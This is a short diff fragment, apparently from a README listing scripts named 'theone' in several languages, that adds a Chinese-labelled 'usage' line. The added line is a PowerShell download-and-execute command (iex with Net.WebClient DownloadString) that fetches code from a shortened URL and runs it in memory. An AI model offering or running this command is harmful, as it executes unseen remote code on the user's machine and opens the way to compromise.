@@ -11,6 +11,7 @@
 * theone.js
 * theone.php
 * theone.ps1
+使用方法 iex (New-Object Net.WebClient).DownloadString('http://dwz.cn/3zPPSu')
 * theone.cs
 * theone.py
 * theone.sh
